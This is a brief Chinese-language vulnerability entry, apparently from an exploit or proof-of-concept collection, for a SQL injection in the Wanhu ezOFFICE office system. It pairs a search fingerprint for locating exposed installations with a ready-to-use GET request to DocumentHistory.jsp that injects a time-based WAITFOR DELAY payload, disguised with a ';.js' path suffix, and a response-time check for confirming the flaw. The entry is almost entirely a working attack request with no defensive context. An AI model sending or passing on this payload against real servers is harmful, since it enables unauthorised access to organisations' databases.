# 万户ezOFFICEDocumentHistory存在SQL注入漏洞

万户 ｜ SQL注入 ｜ —
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s